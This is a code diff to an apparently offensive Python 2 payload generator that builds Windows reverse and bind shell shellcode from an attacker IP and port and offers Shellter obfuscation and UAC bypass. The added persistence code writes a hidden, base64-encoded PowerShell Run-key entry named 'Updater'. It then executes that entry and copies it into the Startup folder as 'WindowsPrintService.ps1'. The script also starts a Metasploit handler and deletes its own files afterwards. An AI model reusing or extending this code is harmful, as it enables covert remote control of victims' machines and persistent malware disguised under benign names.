@@ -184,7 +184,7 @@ print "   /____/".center(t.width)
 print t.normal + '=' * t.width
 
 try:
-    print '[1] Windows Stageless Reverse Shell'.center(t.width) + t.bold_red + '[Shellter]'.center(t.width) + t.normal + '[2] Windows Meterpreter Reverse Shell(staged)'.center(t.width) + t.bold_red + '[Shellter, UacBypass, Priv Esc Checks]'.center(t.width) + t.normal + '[3] Windows Meterpreter Bind Shell(staged)'.center(t.width) + t.bold_red + ' [Shellter, UacBypass, Priv Esc Checks]'.center(t.width) + t.normal + '[4] Windows Meterpreter Reverse Shell(Raw)'.center(t.width) + t.bold_red + '[Base64 Encode]'.center(t.width) + t.normal + '[5] Windows Meterpreter Reverse Shell(Persistence)'.center(t.width) + t.bold_red + '[Shellter]'.center(t.width) + t.normal
+    print '[1] Windows Reverse Shell(Stageless)'.center(t.width) + t.bold_red + '[Shellter]'.center(t.width) + t.normal + '[2] Windows Meterpreter Reverse Shell(Staged)'.center(t.width) + t.bold_red + '[Shellter, UacBypass, Priv Esc Checks]'.center(t.width) + t.normal + '[3] Windows Meterpreter Bind Shell(Staged)'.center(t.width) + t.bold_red + ' [Shellter, UacBypass, Priv Esc Checks]'.center(t.width) + t.normal + '[4] Windows Meterpreter Reverse Shell(Raw)'.center(t.width) + t.bold_red + '[Base64 Encode]'.center(t.width) + t.normal + '[5] Windows Meterpreter Reverse Shell(Persistence)'.center(t.width) + t.bold_red + '[Shellter]'.center(t.width) + t.normal
     print '=' * t.width
     menuchoice = raw_input('> ')
     if menuchoice == '1':
@@ -227,7 +227,7 @@ try:
         ip1, ip2, ip3, ip4 = ipaddr.split('.')
         iphex = struct.pack('BBBB', int(ip1), int(ip2), int(ip3), int(ip4))
         porthex = struct.pack('>h', int(portnum))
-        porthex2 = struct.pack('>h', int(portnum)+1)
+        porthex2 = struct.pack('>h', int(portnum) + 1)
         shellcode = payloadchoice % (iphex, porthex)
         shellcode2 = payloadchoice % (iphex, porthex2)
     elif menuchoice == '3':
@@ -236,7 +236,7 @@ try:
         if len(bindport) is 0:
             bindport = 4444
         bindporthex = struct.pack('>h', int(bindport))
-        bindporthex2 = struct.pack('>h', int(bindport)+1)
+        bindporthex2 = struct.pack('>h', int(bindport) + 1)
         shellcode = payloadchoice % (bindporthex)
         shellcode2 = payloadchoice % (bindporthex2)
 
@@ -288,8 +288,8 @@ try:
 
     if menuchoice == '5':
         with open('persist.ps1', 'w') as persistfile:
-            persistfile.write('New-ItemProperty -Force -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Updater -PropertyType String -Value "`"$($Env:SystemRoot)\System32\WindowsPowerShell\\v1.0\powershell.exe`\" -exec bypass -NonInteractive -WindowStyle Hidden -enc ' +
-                              base64.b64encode(persistencesleep.encode('utf_16_le')) + '\"')
+            persistfile.write("""$persist = 'New-ItemProperty -Force -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Updater -PropertyType String -Value "`"$($Env:SystemRoot)\System32\WindowsPowerShell\\v1.0\powershell.exe`\" -exec bypass -NonInteractive -WindowStyle Hidden -enc """ +
+                              base64.b64encode(persistencesleep.encode('utf_16_le')) + '\"\'; iex $persist; echo $persist > \"$Env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsPrintService.ps1\"')
             persistfile.close()
         with open('persist.rc', 'w') as persistfilerc:
             persistfilerc.write(persistencerc)
@@ -407,8 +407,10 @@ ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
         os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;set autorunscript multi_console_command -rc persist.rc;set ExitOnSession false;exploit -j\'' % portnum)
 
     print t.bold_green + '[*] Cleaning Up\n' + t.normal
-    subprocess.call(['rm *.rc'],shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    subprocess.call(['rm *.ps1'],shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    subprocess.call(['rm *.rc'], shell=True,
+                    stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    subprocess.call(['rm *.ps1'], shell=True,
+                    stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     sys.exit(0)
 except KeyboardInterrupt:
     sys.exit(1)
